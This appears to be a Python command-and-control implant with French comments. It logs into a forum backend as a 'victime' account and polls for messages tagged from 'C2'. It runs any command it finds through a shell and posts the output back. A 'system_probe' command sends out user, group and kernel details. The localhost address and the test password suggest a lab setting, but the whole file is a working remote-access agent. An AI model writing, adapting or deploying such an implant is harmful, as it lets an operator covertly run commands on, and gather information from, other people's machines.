import requests
import time
import subprocess
import json


# Config victime
USER = "victime_1"          # nom de la victime (cible)
PASSWORD = "testtest"
IP = "127.0.0.1"
PORT = 6000                 # backend du forum
MASTER = "C2"               # émetteur attendu (doit matcher [FROM=...])

POLL_INTERVAL_SEC = 2
CMD_TIMEOUT_SEC = 60
SYSTEM_PROBE_PREFIX = "__SYSTEM_PROBE__"


def login(ip: str, port: int, user: str, password: str) -> str:
    r = requests.post(
        f"http://{ip}:{port}/api/auth/login",
        json={"username": user, "password": password},
    )
    r.raise_for_status()
    return r.json()["token"]


def get_messages(ip: str, port: int, token: str):
    r = requests.get(
        f"http://{ip}:{port}/api/messages",
        headers={"Authorization": f"Bearer {token}"},
    )
    r.raise_for_status()
    return r.json()


def send_result(ip: str, port: int, token: str, result_text: str, seq: str | None = None):
    # Résultat simple en texte (lisible par l’op)
    tagged = f"[FROM={USER}];[TO={MASTER}];[SEQ={seq if seq is not None else ''}]; {result_text}"
    r = requests.post(
        f"http://{ip}:{port}/api/messages",
        headers={"Authorization": f"Bearer {token}"},
        json={"body": tagged},
    )
    r.raise_for_status()


def parse_tagged_command(body: str, expected_from: str, expected_to: str):
    """
    Attend un format:
      [FROM=C2];[TO=victime_2];[SEQ=42]; commande à exécuter
    Retourne (commande, seq) si l’en-tête est valide et destiné à expected_to,
    sinon (None, None).
    """
    if not (isinstance(body, str) and body.startswith("[FROM=")):
        return None, None
    try:
        parts = body.split("];")
        # parts exemple:
        # ['[FROM=C2', '[TO=victime_2', '[SEQ=42', ' commande...']
        if len(parts) < 4:
            return None, None

        from_part = parts[0]  # "[FROM=C2"
        to_part = parts[1]    # "[TO=victime_2"
        seq_part = parts[2]   # "[SEQ=42"
        cmd_part = "];".join(parts[3:]).strip()

        sender = from_part.split("=", 1)[1].rstrip("]")
        target = to_part.split("=", 1)[1].rstrip("]")
        seq = seq_part.split("=", 1)[1].rstrip("]")

        if sender != expected_from or target != expected_to:
            return None, None

        return cmd_part, seq
    except Exception:
        return None, None


def run_system_command(command: str) -> str:
    result = subprocess.run(
        command,
        shell=True,
        text=True,
        timeout=CMD_TIMEOUT_SEC,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    return result.stdout.strip()


def build_system_probe_payload() -> str:
    data = {
        "id": run_system_command("id"),
        "groups": run_system_command("groups"),
        "users": run_system_command("users"),
        "uname": run_system_command("uname -a"),
    }
    return SYSTEM_PROBE_PREFIX + json.dumps(data)


def main():
    token = login(IP, PORT, USER, PASSWORD)

    # baseline: dernier id connu (on prend le max global pour ne pas rater)
    try:
        messages = get_messages(IP, PORT, token)
        last_seen_id = max((m.get("id", 0) for m in messages), default=0)
    except Exception:
        last_seen_id = 0

    print(f"[{USER}] prêt. Attente de commandes de {MASTER}... (last_seen_id={last_seen_id})")

    while True:
        try:
            messages = get_messages(IP, PORT, token)

            new_cmd = None
            seq = None
            chosen_id = last_seen_id

            for msg in messages:
                mid = msg.get("id", 0)
                if mid <= last_seen_id:
                    continue
                body = msg.get("body", "")
                cmd, s = parse_tagged_command(body, expected_from=MASTER, expected_to=USER)
                if cmd:
                    new_cmd = cmd.strip()
                    seq = s
                    chosen_id = mid
                    break

            if not new_cmd:
                time.sleep(POLL_INTERVAL_SEC)
                continue

            last_seen_id = chosen_id

            # exit => se terminer proprement
            if new_cmd.lower() == "exit":
                send_result(IP, PORT, token, f"{USER} exit.", seq)
                print("Exit reçu, arrêt.")
                break

            if new_cmd.lower() == "system_probe":
                try:
                    output = build_system_probe_payload()
                except Exception as e:
                    output = f"[ERREUR SYSTEM_PROBE] {e}"
                send_result(IP, PORT, token, output, seq)
                time.sleep(0.3)
                continue

            # exécuter la commande
            try:
                output = run_system_command(new_cmd)
            except Exception as e:
                output = f"[ERREUR EXEC] {e}"

            # envoyer le résultat
            send_result(IP, PORT, token, output, seq)

            time.sleep(0.3)

        except requests.RequestException as e:
            print(f"[network] {e}, retry in {POLL_INTERVAL_SEC}s")
            time.sleep(POLL_INTERVAL_SEC)
            try:
                token = login(IP, PORT, USER, PASSWORD)
            except Exception:
                pass
        except Exception as e:
            print(f"[loop] erreur: {e}")
            time.sleep(POLL_INTERVAL_SEC)

    print("Agent arrêté.")

if __name__ == "__main__":
    main()
